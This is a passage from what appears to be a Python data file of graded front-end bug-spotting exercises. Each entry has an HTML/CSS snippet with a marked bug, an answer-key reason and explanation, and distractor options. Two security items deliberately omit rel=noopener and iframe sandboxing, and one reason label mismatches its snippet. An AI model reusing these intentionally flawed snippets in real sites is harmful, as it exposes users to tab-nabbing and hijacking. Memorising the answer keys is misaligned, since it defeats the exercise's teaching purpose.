            ["Undefined CSS custom property with no fallback", "Box model overflow from missing box-sizing", "Media query source-order bug"],
        ),
        _entry(
            "easy", "Images", "Hero Banner",
            "<section class=\"hero\">\n"
            "  <img src=\"/img/hero-sale.jpg\" alt=\"Summer sale, up to 40% off\">  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  <h1>Summer Sale</h1>\n"
            "</section>\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Missing width/height causes layout shift",
                "explanation": (
                    "With no `width`/`height` attributes, the browser doesn't know the image's aspect ratio "
                    "before it finishes downloading, so it reserves zero space for it and everything below it "
                    "(the `<h1>`) jumps down the moment the image loads - a visible layout shift that hurts both "
                    "the user experience and Core Web Vitals (CLS). Add `width`/`height` attributes matching the "
                    "image's real aspect ratio (or set them via CSS `aspect-ratio`) so the browser reserves the "
                    "correct space up front, even before the image data arrives."
                ),
            }],
            ["Missing alt text", "Missing viewport meta tag", "z-index without positioning"],
        ),
        _entry(
            "easy", "Links", "Fake Button Link",
            "<div class=\"card\">\n"
            "  <h3>Trail Socks</h3>\n"
            "  <span onclick=\"viewProduct(7)\" class=\"link\">View details</span>  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "</div>\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Anchor without href is not keyboard focusable",
                "explanation": (
                    "A `<span onclick>` styled to look like a link has none of a real `<a href>`'s behavior: no "
                    "keyboard focus, no Enter-to-activate, no 'open in new tab' via middle-click/right-click, "
                    "and screen readers don't announce it as a link at all since it isn't one. If it navigates "
                    "to a real URL, it should be a genuine `<a href=\"/products/7\">` - real anchors get all of "
                    "that behavior for free with zero extra JS or ARIA needed."
                ),
            }],
            ["Missing alt text", "Unscoped global CSS selector", "Missing form label association"],
        ),
        _entry(
            "easy", "Color Contrast", "Muted Label",
            ".field-hint {\n"
            "  color: #b3b3b3;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  background: #f5f5f5;\n"
            "  font-size: 0.85rem;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Color contrast too low for accessibility",
                "explanation": (
                    "Light gray text (`#b3b3b3`) on a near-white background (`#f5f5f5`) falls well under the "
                    "WCAG AA minimum contrast ratio (4.5:1 for normal-size text) - readable to someone with "
                    "typical vision in good lighting, but genuinely hard or impossible to read for low-vision "
                    "users, and it fails automated accessibility audits outright. Darken the text (or lighten "
                    "the background) until a contrast checker confirms at least 4.5:1."
                ),
            }],
            ["z-index without positioning", "Overuse of !important", "Box model overflow from missing box-sizing"],
        ),
        _entry(
            "easy", "Viewport", "Page Head",
            "<!DOCTYPE html>\n"
            "<html lang=\"en\">\n"
            "<head>\n"
            "  <meta charset=\"UTF-8\">  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  <title>Trailhead Outfitters</title>\n"
            "  <link rel=\"stylesheet\" href=\"/styles.css\">\n"
            "</head>\n"
            "<body>\n"
            "  <h1>Welcome</h1>\n"
            "</body>\n"
            "</html>\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Missing viewport meta tag",
                "explanation": (
                    "Without `<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">`, mobile "
                    "browsers render the page at a desktop-width virtual viewport (typically 980px) and then "
                    "zoom it to fit the screen, making text tiny and any responsive/media-query CSS never "
                    "actually engage at the intended breakpoints - the page LOOKS like a shrunk desktop layout "
                    "instead of a real mobile layout. This one tag is what tells the browser to size the "
                    "viewport to the actual device width and enables responsive breakpoints to work as authored."
                ),
            }],
            ["Missing width/height causes layout shift", "Overuse of !important", "Missing form label association"],
        ),
        _entry(
            "easy", "CSS Selectors", "Global Reset",
            "div {\n"
            "  margin: 0;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  padding: 12px;\n"
            "  border: 1px solid #ddd;\n"
            "}\n"
            "\n"
            ".product-card {\n"
            "  display: flex;\n"
            "  gap: 12px;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Unscoped global CSS selector",
                "explanation": (
                    "A bare element selector like `div` applies to EVERY `<div>` on the entire page, not just "
                    "the ones this styling was actually intended for - every unrelated div elsewhere in the app "
                    "(layout wrappers, third-party widget containers, anything) unexpectedly gets a border and "
                    "12px padding too. Scope the rule to a class that specifically marks the elements meant to "
                    "be styled (e.g. `.bordered-box`), instead of reaching for a bare tag selector for anything "
                    "beyond genuine resets."
                ),
            }],
            ["Missing width/height causes layout shift", "Anchor without href is not keyboard focusable", "z-index without positioning"],
        ),
        _entry(
            "medium", "HTML Semantics", "List of Reasons",
            "<div class=\"reasons\">\n"
            "  <div class=\"reason\">Free shipping over $50</div>  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  <div class=\"reason\">30-day returns</div>\n"
            "  <div class=\"reason\">Carbon-neutral delivery</div>\n"
            "</div>\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Non-semantic markup for list content",
                "explanation": (
                    "This is genuinely a list of items - visually and conceptually - but it's marked up as "
                    "generic `<div>`s instead of `<ul><li>`. Screen readers announce a real list's item count "
                    "and position ('list of 3 items, item 1') which helps users understand the structure; a div "
                    "soup gives none of that signal even though it's visually identical. Use `<ul>` with "
                    "`<li>` children whenever the content is genuinely a set of items, styled however you like."
                ),
            }],
            ["Missing form label association", "z-index without positioning", "Overuse of !important"],
        ),
        _entry(
            "medium", "Grid", "Product Grid",
            ".product-grid {\n"
            "  display: grid;\n"
            "  grid-template-columns: 1fr 1fr 1fr 1fr;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  gap: 16px;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Fixed grid columns don't adapt to content count or width",
                "explanation": (
                    "Hardcoding exactly 4 equal columns means the grid never adapts: on a narrow viewport those "
                    "4 columns get squeezed uncomfortably small (no wrapping happens, unlike Flexbox with "
                    "`flex-wrap`), and if there are only 2 products, 2 columns sit awkwardly empty. "
                    "`grid-template-columns: repeat(auto-fit, minmax(200px, 1fr))` lets the grid fit as many "
                    "200px+ columns as the container width allows, reflowing naturally at any viewport size "
                    "without a media query."
                ),
            }],
            ["Missing flex-wrap causes overflow", "Undefined CSS custom property with no fallback", "Media query source-order bug"],
        ),
        _entry(
            "medium", "Transitions", "Button Hover",
            ".btn {\n"
            "  background: #268bd2;\n"
            "  padding: 10px 18px;\n"
            "  transition: all 0.2s;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            ".btn:hover {\n"
            "  background: #1b4f7a;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Transitioning `all` animates unintended properties",
                "explanation": (
                    "`transition: all` animates EVERY property that changes on this element, not just the "
                    "`background` this rule cares about - if any other rule (a later media query, a JS-toggled "
                    "class, even `width`/`padding` from an unrelated state change) touches this element later, "
                    "it now unintentionally animates too, and `all` is also marginally more expensive for the "
                    "browser to watch every property for changes. Name the specific property: "
                    "`transition: background 0.2s;`, so only the intended property animates."
                ),
            }],
            ["Overuse of !important", "z-index without positioning", "Fixed grid columns don't adapt to content count or width"],
        ),
        _entry(
            "medium", "Viewport Units", "Full-Height Hero",
            ".hero {\n"
            "  height: 100vh;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  display: flex;\n"
            "  align-items: center;\n"
            "  justify-content: center;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "100vh overflows on mobile due to dynamic browser chrome",
                "explanation": (
                    "On mobile browsers, the address bar/toolbar can show and hide as the user scrolls, and "
                    "`100vh` is calculated against the LARGEST possible viewport (chrome hidden) on many mobile "
                    "browsers - so with the address bar visible, `.hero` ends up TALLER than the actually-visible "
                    "screen, cutting off its bottom content or forcing an unwanted scroll. The modern fix is the "
                    "dynamic viewport unit `100dvh`, which tracks the viewport's actual current visible size "
                    "including browser chrome state, instead of a fixed worst/best-case value."
                ),
            }],
            ["Missing width/height causes layout shift", "Fixed pixel widths break responsiveness", "Non-semantic markup for list content"],
        ),
        _entry(
            "medium", "Forms", "Checkbox Group",
            "<fieldset>\n"
            "  <legend>Notify me about</legend>\n"
            "  <input type=\"checkbox\" id=\"notify\" name=\"restock\"> <label for=\"notify\">Restocks</label>\n"
            "  <input type=\"checkbox\" id=\"notify\" name=\"sale\"> <label for=\"notify\">Sales</label>  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "</fieldset>\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Duplicate id breaks label/ARIA association",
                "explanation": (
                    "Both checkboxes reuse `id=\"notify\"` - HTML ids must be unique per page, and when they "
                    "aren't, `<label for=\"notify\">` associates with only the FIRST matching element, so "
                    "clicking the second label toggles the wrong (first) checkbox, and a screen reader announces "
                    "the wrong name for it too. Every checkbox needs its own unique id (e.g. `notify-restock`, "
                    "`notify-sale`) with its label's `for` matching it exactly."
                ),
            }],
            ["Missing form label association", "Non-semantic markup for list content", "100vh overflows on mobile due to dynamic browser chrome"],
        ),
        _entry(
            "hard", "Performance", "Render-Blocking Stylesheet",
            "/* main.css */\n"
            "@import url(\"reset.css\");  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "@import url(\"typography.css\");\n"
            "\n"
            ".page {\n"
            "  max-width: 1100px;\n"
            "  margin: 0 auto;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "@import serializes stylesheet loading, blocking render",
                "explanation": (
                    "`@import` inside a stylesheet forces the browser to discover and fetch `reset.css` and "
                    "`typography.css` only AFTER `main.css` itself has been downloaded and parsed far enough to "
                    "see the `@import` rules - and render is blocked until all of them finish, one round trip "
                    "chained after another rather than in parallel. Linking each stylesheet directly with its "
                    "own `<link rel=\"stylesheet\">` in the HTML lets the browser discover and fetch all of them "
                    "in parallel from the start, which is strictly faster for the exact same CSS."
                ),
            }],
            ["Layout thrashing from forced reflow", "Media query source-order bug", "Overuse of !important"],
        ),
        _entry(
            "hard", "Security", "External Link Target",
            "<p>Read the full review on \n"
            "  <a href=\"https://partner-reviews.example.com/review/42\" target=\"_blank\">their site</a>  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "</p>\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Missing rel=noopener on target=_blank link",
                "explanation": (
                    "`target=\"_blank\"` opens the link in a new tab, but without `rel=\"noopener\"`, the new "
                    "page gets a live `window.opener` reference back to the ORIGINAL tab - a malicious "
                    "destination page can use that reference to navigate the original tab to a phishing page "
                    "(a 'tab-nabbing' attack), and it also lets the new page's JS run on the same shared "
                    "process/event loop in older browsers, a minor performance cost too. Add "
                    "`rel=\"noopener\"` (or `noopener noreferrer` to also withhold the referrer) to every "
                    "`target=\"_blank\"` link to an external/untrusted origin."
                ),
            }],
            ["XSS via unescaped innerHTML", "Non-semantic div used for interactive control", "z-index without positioning"],
        ),
        _entry(
            "hard", "Accessibility", "Data Table",
            "<table>\n"
            "  <tr>\n"
            "    <td>Plan</td> <td>Price</td> <td>Storage</td>  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  </tr>\n"
            "  <tr>\n"
            "    <td>Basic</td> <td>$9/mo</td> <td>50GB</td>\n"
            "  </tr>\n"
            "  <tr>\n"
            "    <td>Pro</td> <td>$29/mo</td> <td>500GB</td>\n"
            "  </tr>\n"
            "</table>\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Missing scope attribute on table headers",
                "explanation": (
                    "The header row uses plain `<td>` instead of `<th scope=\"col\">` - visually identical if "
                    "styled the same, but a screen reader has no way to know these cells are column headers, so "
                    "it can't announce 'Price: $29/mo' when a user navigates to that data cell, only the raw "
                    "cell contents with no header context. Use `<th scope=\"col\">Plan</th>` etc. for the header "
                    "row so assistive tech can programmatically associate each data cell with its header."
                ),
            }],
            ["Missing form label association", "Custom control missing ARIA state/keyboard support", "Missing alt text"],
        ),
        _entry(
            "hard", "CSS Layout", "Sticky Header",
            ".table-wrapper {\n"
            "  overflow-x: auto;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            "thead th {\n"
            "  position: sticky;\n"
            "  top: 0;\n"
            "  background: white;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Ancestor overflow breaks position: sticky",
                "explanation": (
                    "`position: sticky` sticks an element relative to its nearest scrolling ancestor - but "
                    "`.table-wrapper` sets `overflow-x: auto`, which (per the CSS spec) creates a new scroll "
                    "container for BOTH axes, not just the horizontal one it was meant for. That makes the "
                    "sticky header stick within the wrapper's own tiny scroll box instead of the page, which "
                    "usually means it never visibly 'sticks' at all as the page scrolls. If only horizontal "
                    "scroll is intended, this needs a more targeted layout (e.g. `overflow-x: auto; overflow-y: "
                    "visible;` doesn't fully fix it either - sticky headers with horizontal-scroll tables "
                    "typically need the sticky element positioned outside the scrolling wrapper entirely)."
                ),
            }],
            ["Fixed pixel widths break responsiveness", "z-index without positioning", "Media query source-order bug"],
        ),
        _entry(
            "hard", "Responsive Design", "Image Srcset",
            "<img src=\"/img/hero-2400w.jpg\" alt=\"New arrivals\">  \xe2\x80\xa1bug1\xe2\x80\xa1\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Missing responsive images wastes mobile bandwidth",
                "explanation": (
                    "A single `src` pointing at a 2400px-wide image gets downloaded in full even on a 375px-wide "
                    "phone screen, where it's scaled down by CSS to a fraction of its real size - wasted "
                    "bandwidth and slower load, especially painful on a mobile connection. `srcset` (with "
                    "`sizes`) lets the browser choose from several image widths and pick the smallest one that "
                    "still looks sharp for the actual rendered size and device pixel ratio, e.g. `srcset=\"/img/"
                    "hero-600w.jpg 600w, /img/hero-1200w.jpg 1200w, /img/hero-2400w.jpg 2400w\" sizes=\"100vw\"`."
                ),
            }],
            ["Missing width/height causes layout shift", "Fixed pixel widths break responsiveness", "Missing alt text"],
        ),
        _entry(
            "expert", "Security", "Third-Party Widget",
            "<div class=\"support-widget\">\n"
            "  <iframe src=\"https://widget.thirdparty-support.example.com/embed\" width=\"360\" height=\"480\"></iframe>  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "</div>\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "iframe missing sandbox attribute",
                "explanation": (
                    "Embedding a third-party iframe with no `sandbox` attribute gives it the SAME capabilities "
                    "it would have if navigated to directly - full script execution, form submission, "
                    "top-level navigation of your page, popups, and more - all inside your own page's context. "
                    "If that third party is ever compromised (or was malicious from the start), it can hijack "
                    "the embedding page's users. `sandbox=\"allow-scripts allow-forms\"` (only the specific "
                    "capabilities the widget genuinely needs, nothing more) restricts it to the minimum "
                    "necessary, blocking things like top-level navigation (`allow-top-navigation` is "
                    "deliberately omitted) by default."
                ),
            }],
            ["XSS via unescaped innerHTML", "Missing rel=noopener on target=_blank link", "z-index without positioning"],
        ),
        _entry(
            "expert", "CSS Performance", "Card Hover Lift",
            ".product-card {\n"
            "  box-shadow: 0 1px 3px rgba(0,0,0,0.15);\n"
            "  transition: box-shadow 0.2s, margin-top 0.2s;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            ".product-card:hover {\n"
            "  box-shadow: 0 8px 20px rgba(0,0,0,0.25);\n"
            "  margin-top: -4px;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Animating layout properties instead of transform/opacity",
                "explanation": (
                    "Animating `margin-top` triggers layout (reflow) on every frame of the transition, since "
                    "shifting an element's margin can move every sibling around it too - on a grid of many "
                    "cards, hovering one repeatedly recomputes layout for the whole row/page each frame, which "
                    "can visibly stutter. The same 'lift' effect achieved with `transform: translateY(-4px)` "
                    "instead only affects that one element and can run entirely on the compositor thread (no "
                    "layout, often no paint), giving an equivalent visual result far more cheaply. `box-shadow` "
                    "itself is paint-only (not layout) so it's less costly, but pairing it with a transform "
                    "instead of a margin change avoids the layout cost entirely."
                ),
            }],
            ["Layout thrashing from forced reflow", "Overuse of !important", "Fixed pixel widths break responsiveness"],
        ),
    ],
}
